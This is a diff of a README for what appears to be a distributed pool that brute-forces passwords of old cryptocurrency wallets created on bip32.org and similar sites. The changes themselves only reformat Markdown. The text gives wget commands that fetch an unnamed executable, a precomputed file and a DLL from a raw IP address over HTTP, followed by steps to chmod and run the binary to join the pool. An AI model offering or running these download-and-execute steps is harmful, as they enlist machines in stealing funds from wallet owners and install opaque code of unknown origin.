@@ -26,21 +26,33 @@
 
 
 ## Connect to the pool
-#### Linux:
-wget http://95.215.108.160/up/xx<br>
-wget http://95.215.108.160/up/precomp.bin<br>
-wget http://95.215.108.160/up/libcrypto-1_1-x64.dll<br>
-```chmod +x xx```<br>
-```./xx -u YourNickName --bloom 2048M```<br>
+### Linux:
+```
+wget http://95.215.108.160/up/xx
+```
+```
+wget http://95.215.108.160/up/precomp.bin
+```
+```
+wget http://95.215.108.160/up/libcrypto-1_1-x64.dll
+```
+```
+chmod +x xx
+```
+```
+./xx -u YourNickName --bloom 2048M
+```
 
-#### Windows:
+### Windows:
 http://95.215.108.160/up/xx.exe<br>
 http://95.215.108.160/up/precomp.bin<br>
 http://95.215.108.160/up/libcrypto-1_1-x64.dll<br>
-```xx.exe -u Nick_Name --bloom 2048M```<br>
+```
+xx.exe -u Nick_Name --bloom 2048M
+```
 
 
-## FAQ
+## FAQ :question:
 **What does this pool do?**
 
 Collectively brute forces passwords from old wallets created on bip32.org and others.<br>
